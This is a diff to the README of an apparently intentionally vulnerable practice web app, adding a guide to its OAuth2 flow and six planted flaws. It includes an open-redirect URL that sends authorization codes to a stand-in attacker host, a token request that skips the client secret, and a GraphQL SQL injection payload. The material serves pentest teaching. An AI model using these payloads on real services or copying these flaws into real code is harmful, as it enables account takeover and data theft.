@@ -12,6 +12,8 @@ To perform your pentests, use the following known values:
 *   **Secret Header:** `secret-header: my-secret-header`
 *   **Secret Cookie:** `secret-cookie: my-secret-cookie`
 *   **Bearer Token Header:** `token: Bearer Sf54F-/f#${wf}!*aR.y%`
+*   **OAuth2 Client ID:** `vulapp-client-001`
+*   **OAuth2 Client Secret:** `super-secret-client-secret`
 
 ---
 
@@ -21,6 +23,10 @@ To perform your pentests, use the following known values:
 *   **`/web/login`**: Simple Login form. Vulnerable to **SQL Injection Bypass**.
 *   **`/web/login-2fa`**: Login form with TOTP. Requires User + Pass + OTP code.
 *   **`/web/logout`**: Clears the current session.
+*   **`/web/oauth2/login`**: OAuth2 flow landing page. Links to the authorization endpoint.
+*   **`/web/oauth2/authorize`**: OAuth2 authorization + consent screen. Vulnerable to **Open Redirect**, **No CSRF (state)**.
+*   **`/web/oauth2/callback`**: OAuth2 callback page with interactive token exchange.
+*   **`/web/oauth2/profile`**: OAuth2 protected profile. Vulnerable to **Token in Query String**.
 
 ### Protected "Welcome" Pages
 These pages require specific authentication or headers to access. All `/web/welcome-` requests are logged to `welcome_requests.log` and the console.
@@ -54,6 +60,8 @@ These pages require specific authentication or headers to access. All `/web/welc
 *   **`/api/v1/is-valid-token`**: Validates the Bearer token in the `token` header.
 *   **`/api/v1/graphql`**: GraphQL API endpoint (JSON). Vulnerable to **SQL Injection**, **Introspection**, exposes **password field**.
 *   **`/api/v1/graphql/schema`**: GraphQL schema introspection (returns JSON).
+*   **`/api/v1/oauth2/token`**: OAuth2 token exchange. Vulnerable to **missing client_secret validation**, **auth code replay**.
+*   **`/api/v1/oauth2/userinfo`**: OAuth2 protected user profile (requires Bearer token).
 
 ---
 
@@ -173,6 +181,116 @@ curl -X POST http://localhost:5000/api/v1/graphql \
   -H "Content-Type: application/json" \
   -d '{"query": "{ users(search: \"'\"'\" OR '\"'\"1'\"'\"='\"'\"1\") { id username email bio } }"}'
 ```
+
+---
+
+## OAuth2 Testing Guide
+
+### Overview
+
+VulApp implements a simulated OAuth2 Authorization Code flow with intentional vulnerabilities for pentest practice.
+
+### OAuth2 Credentials
+
+*   **Client ID:** `vulapp-client-001`
+*   **Client Secret:** `super-secret-client-secret`
+*   **User Login:** `admin` / `easypassword`
+
+### OAuth2 Endpoints
+
+| Path | Method | Type | Description |
+| :--- | :--- | :--- | :--- |
+| `/web/oauth2/login` | GET | Web | Landing page with flow overview |
+| `/web/oauth2/authorize` | GET/POST | Web | Authorization + consent screen |
+| `/web/oauth2/callback` | GET | Web | Receives auth code, interactive token exchange |
+| `/web/oauth2/profile` | GET | Web/API | Protected resource (accepts Bearer token or `?token=`) |
+| `/api/v1/oauth2/token` | POST | API | Exchange auth code for access token |
+| `/api/v1/oauth2/userinfo` | GET | API | Returns user profile with valid Bearer token |
+
+### How to Use (Step by Step)
+
+#### 1. Start the Authorization Flow (Browser)
+
+Visit the authorize endpoint with the required parameters:
+
+```
+http://localhost:5000/web/oauth2/authorize?response_type=code&client_id=vulapp-client-001&redirect_uri=http://localhost:5000/web/oauth2/callback&scope=read%20profile&state=random123
+```
+
+Or simply click "Start OAuth2 Flow" from `/web/oauth2/login`.
+
+#### 2. Authenticate and Authorize
+
+On the consent screen, log in with `admin` / `easypassword` and click **Authorize**. You'll be redirected to the callback URL with an authorization code:
+
+```
+/web/oauth2/callback?code=abc123def456&state=random123
+```
+
+#### 3. Exchange Code for Token (API)
+
+```bash
+curl -X POST http://localhost:5000/api/v1/oauth2/token \
+  -H "Content-Type: application/json" \
+  -d '{
+    "grant_type": "authorization_code",
+    "code": "<AUTH_CODE_FROM_STEP_2>",
+    "client_id": "vulapp-client-001",
+    "client_secret": "super-secret-client-secret",
+    "redirect_uri": "http://localhost:5000/web/oauth2/callback"
+  }'
+```
+
+**Response:**
+```json
+{
+  "access_token": "a1b2c3d4e5f6...",
+  "token_type": "Bearer",
+  "expires_in": 3600,
+  "scope": "read profile"
+}
+```
+
+#### 4. Access Protected Resources (API)
+
+```bash
+curl http://localhost:5000/api/v1/oauth2/userinfo \
+  -H "Authorization: Bearer <ACCESS_TOKEN>"
+```
+
+**Response:**
+```json
+{
+  "sub": "admin",
+  "username": "admin",
+  "email": "admin@vulapp.local",
+  "scope": "read profile"
+}
+```
+
+### OAuth2 Vulnerabilities
+
+This OAuth2 implementation contains the following intentional vulnerabilities:
+
+1.  **Open Redirect** — `redirect_uri` is never validated. Change it to any external URL to steal auth codes:
+    ```
+    /web/oauth2/authorize?response_type=code&client_id=vulapp-client-001&redirect_uri=https://evil.com/steal&scope=read&state=x
+    ```
+2.  **No CSRF Protection (state)** — The `state` parameter is passed through but never validated, allowing cross-site request forgery attacks on the authorization flow.
+3.  **Authorization Code Replay** — Auth codes are not invalidated after use. The same code can be exchanged for tokens multiple times.
+4.  **No Client Secret Validation** — The token endpoint accepts any value (or no value) for `client_secret`:
+    ```bash
+    curl -X POST http://localhost:5000/api/v1/oauth2/token \
+      -H "Content-Type: application/json" \
+      -d '{"grant_type":"authorization_code","code":"<CODE>","client_id":"vulapp-client-001"}'
+    ```
+5.  **Token in Query String** — The profile endpoint accepts tokens via URL parameter, which leaks in server logs and Referer headers:
+    ```
+    /web/oauth2/profile?token=<ACCESS_TOKEN>
+    ```
+6.  **Predictable Auth Codes** — Codes are generated using MD5 of username + timestamp, making them guessable.
+
+---
 
 ### GraphQL Vulnerabilities
 
